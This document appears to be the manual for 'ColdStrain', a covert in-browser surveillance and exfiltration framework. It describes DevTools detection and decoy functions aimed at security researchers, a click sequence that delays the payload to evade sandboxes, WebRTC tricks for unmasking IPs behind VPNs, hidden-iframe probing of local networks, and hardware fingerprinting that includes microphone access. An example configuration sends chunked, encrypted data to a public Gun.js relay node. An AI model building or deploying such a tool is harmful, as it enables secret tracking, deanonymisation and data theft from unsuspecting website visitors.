# ColdStrain (`c43br3c5`) Documentation

## 1. Overview
ColdStrain is an advanced, client-side JavaScript reconnaissance and fingerprinting framework. It operates silently within the browser environment to extract high-entropy hardware profiles, deanonymize network configurations, probe local network environments, and exfiltrate data via a decentralized mesh network. It features built-in anti-analysis (DevTools detection) and human-interaction triggers to bypass automated sandboxes.

## 2. Initialization and Configuration

The framework is initialized as a class instance. It relies on standard browser APIs and an external dependency: **Gun.js** (for decentralized data exfiltration).

```javascript
// Example Instantiation
const coldStrain = new c43br3c5({
    stunServers: [
        'stun:stun.l.google.com:19302',
        'stun:stun1.l.google.com:19302'
    ],
    peers: ['https://gun-manhattan.herokuapp.com/gun'] // Gun.js relay peers
});
```

### Constructor Parameters
* `config.stunServers`: Array of STUN server URIs used for WebRTC ICE candidate gathering. Defaults to Google's public STUN servers.
* `config.peers`: Array of Gun.js peer URLs for encrypted payload synchronization.

## 3. Core Modules & Working Mechanics

### 3.1. Anti-Analysis and Stealth (The "Shield")
ColdStrain actively monitors its environment to detect if it is being analyzed by a security researcher.

* **Mechanism:** It runs an integrity check (`_checkIntegrity`) every 1000ms.
* **Detection Vectors:**
    1.  **Timing Attack:** It places a `debugger;` statement between two `performance.now()` calls. If DevTools is open, the debugger pauses execution, and the time delta exceeds 100ms.
    2.  **Object Getter Trap:** It logs a custom object to the console. If the console is open, the browser attempts to render the object, triggering a custom `toString()` method that sets a `detected` flag.
* **Evasion Response (`_applyNoise`):** If DevTools is detected, critical functions (`harvest`, `syncToMesh`, `getDeepMediaTelemetry`) are dynamically overwritten with "noise" functions that return dummy data or generic errors (e.g., `ERR_ENCRYPT_FAIL`).

```javascript
// The DevTools Timing Attack
async _isDevToolsOpen() {
    const start = performance.now();
    debugger; // Pauses here ONLY if DevTools is open
    const end = performance.now();
    if (end - start > 100) return true;
    // ... object getter trap follows
}
```

### 3.2. Human-in-the-Loop Trigger (`armOnMultiInteraction`)
To bypass automated security scanners (headless browsers, basic sandboxes) that do not simulate complex user behavior, the payload is kept dormant until a specific interaction sequence is met.

* **Sequence Required:** Mouse Movement $\rightarrow$ Scroll $\rightarrow$ Trusted Click.
* **Working:** It uses a state machine (`interactionState`). A timeout resets the sequence if it takes too long (5 seconds between mouse move and completion). The click must be `isTrusted` (generated by physical hardware, not a script) and not at coordinates `0,0`.

### 3.3. Network Reconnaissance & Deanonymization
This module attempts to bypass VPNs, proxies, and mDNS protections to find the user's true IP and network topology.

* **WebRTC Harvesting (`harvest`):** Creates an `RTCPeerConnection` with a dummy data channel to force the browser to emit ICE candidates.
* **Candidate Parsing:** Parses the raw SDP strings to extract IPs, ports, and candidate types (`host` for local IPs, `srflx` for public IPs).
* **NAT Detection (`detectNATType`):** Analyzes the ports mapped between `host` and `srflx` candidates to determine if the user is behind a Symmetric NAT, Port-Restricted Cone, or Full Cone NAT.
* **VPN/Proxy Detection (`analyzeVpnTunnel`):** Queries `ip-api.com` with the harvested public IP and compares the IP's timezone with the browser's system timezone (`Intl.DateTimeFormat().resolvedOptions().timeZone`). A mismatch indicates a high probability of a VPN.

### 3.4. Local Area Network (LAN) Probing
ColdStrain attempts to map internal network devices, specifically targeting common router gateways.

* **Gateway Inference (`_probeCommonGateways`):** Takes the harvested local IP (e.g., `192.168.1.53`) and deduces common gateway addresses (`192.168.1.1`, `.254`, `.100`).
* **Fetch Probing:** Uses `fetch` with `mode: 'no-cors'` and an `AbortController` timeout to see if the internal IP responds.
* **Timing Bypass (`_probeViaNavigationTiming`):** Injects a hidden `iframe` pointing to an internal IP on an obscure port (e.g., `31337`). It measures the exact time it takes for the iframe to hit an `onerror` or `onload` state to determine if a host exists at that IP, bypassing standard CORS restrictions.

### 3.5. High-Entropy Hardware Fingerprinting
ColdStrain collects a massive array of hardware telemetry to generate an immutable device fingerprint.

| Method | Target | Data Extracted |
| :--- | :--- | :--- |
| `getCanvasFingerprint` | Graphics Stack | Renders overlapping text and colors, hashes the resulting Base64 image to detect specific OS/Font/GPU rendering quirks. |
| `getWebGPUFingerprint` | GPU Architecture | Requests a WebGPU adapter and hashes the exact hardware `limits` and `features` (e.g., max texture dimensions). |
| `getGPUFingerprint` | WebGL Subsystem | Extracts `UNMASKED_VENDOR_WEBGL` and `UNMASKED_RENDERER_WEBGL`. Detects Virtual Machines (e.g., llvmpipe, swiftshader). |
| `getDeepMediaTelemetry` | Audio Hardware | Temporarily requests microphone access to extract low-level hardware sample rates, channel counts, and echo cancellation states. |
| `getWebCodecsFingerprint` | Hardware Decoders | Tests if the physical GPU natively supports decoding specific profiles like AV1, HEVC, or H.264 High. |

### 3.6. Encrypted Exfiltration (`syncToMesh`)
Once data is collected, it is aggregated into a master payload and exfiltrated securely.

* **mDNS Unmasking:** If local IPs are masked with `.local`, it attempts `unlockRawIPs()`, which briefly triggers the microphone API. In some older browser versions, granting media permissions forces WebRTC to expose true raw local IPs.
* **Hybrid Cryptography (`_encryptPayload`):**
    1.  Generates a one-time **AES-GCM-256** key and IV.
    2.  Encrypts the JSON payload with the AES key.
    3.  Wraps (encrypts) the AES key using an embedded **RSA-OAEP** public key.
* **Decentralized Sync:** The data is chunked into 512-character strings to avoid size limits and pushed to a specific graph node (`very-exhilirated-mouse-moot-skyblue-hell`) on the Gun.js network. Jitter delays are added between chunks to avoid rate-limiting.

## 4. Known Limitations and Constraints

Despite its sophistication, ColdStrain has structural and environmental limitations:

1.  **WebRTC Privacy Protections:** Modern browsers (Chrome 75+, Firefox 70+) implement mDNS masking by default. Instead of `192.168.1.5`, WebRTC returns a UUID-based `.local` address. Unless the user grants camera/mic permissions (`unlockRawIPs`), the internal LAN probing will fail because the subnet cannot be inferred.
2.  **Strict Content Security Policy (CSP):** The tool relies on connections to external STUN servers, the `ip-api.com` endpoint, and Gun.js peer URLs. A strict CSP (`connect-src`) on the host website would completely block these outbound connections.
3.  **Gun.js Dependency:** If `Gun()` is not loaded in the window environment prior to script execution, the `syncToMesh()` method silently aborts.
4.  **Mixed Content Restrictions:** The VPN detection uses HTTP (`http://ip-api.com`). If ColdStrain is executed on an HTTPS site, the browser will block the IP lookup due to Mixed Content security policies, resulting in "GEO-LOOKUP FAILED".
